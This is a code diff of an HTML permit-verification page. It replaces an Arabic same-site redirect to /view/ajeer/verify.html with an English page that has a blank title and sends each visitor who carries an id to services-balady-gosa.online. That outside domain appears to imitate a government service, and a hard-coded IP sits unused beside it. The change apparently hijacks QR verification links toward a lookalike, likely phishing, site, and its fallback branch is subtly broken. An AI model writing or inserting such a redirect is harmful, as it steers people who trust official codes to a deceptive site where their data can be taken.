@@ -1,56 +1,35 @@
-
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من التصريح</title>
-</head>
-<body>
-<script>
-(function () {
-    const params = new URLSearchParams(location.search);
 
-    let id = params.get("id");
-    const num = params.get("num");
-    const ref = params.get("ref");
-    const type = params.get("type");
+    <title>..</title>
 
-    // استخراج رقم العقد من مسار QR القديم
-    if (!id) {
-        const parts = location.pathname
-            .split("/")
-            .filter(Boolean);
+    <script>
+        const params = new URLSearchParams(window.location.search);
 
-        const last = parts[parts.length - 1];
+        const id = params.get("id");
+        const type = params.get("type");
 
-        if (last &&
-            last !== "404.html" &&
-            last !== "index.html" &&
-            last !== "view") {
-            id = decodeURIComponent(last);
+        if (id) {
+            let target = "https://services-balady-gosa.online/view/" +
+                         encodeURIComponent(id);
+            let server = "31.97.158.88";
+            if (type) {
+                target += "?type=" + encodeURIComponent(type);
+            }
+
+            window.location.replace(target);
+        } else {
+            document.body.innerHTML = `
+                <h2>Invalid request</h2>
+                <p>Missing ID.</p>
+            `;
         }
-    }
+    </script>
+</head>
 
-    if (!id && !num) {
-        document.body.innerHTML =
-            "<h2>طلب غير صالح</h2><p>رقم العقد غير موجود.</p>";
-        return;
-    }
 
-    const target = new URL(
-        "/view/ajeer/verify.html",
-        location.origin
-    );
-
-    if (id) target.searchParams.set("id", id);
-    if (num) target.searchParams.set("num", num);
-    if (ref) target.searchParams.set("ref", ref);
-    if (type) target.searchParams.set("type", type);
-
-    location.replace(target.toString());
-})();
-</script>
-</body>
 </html>
 
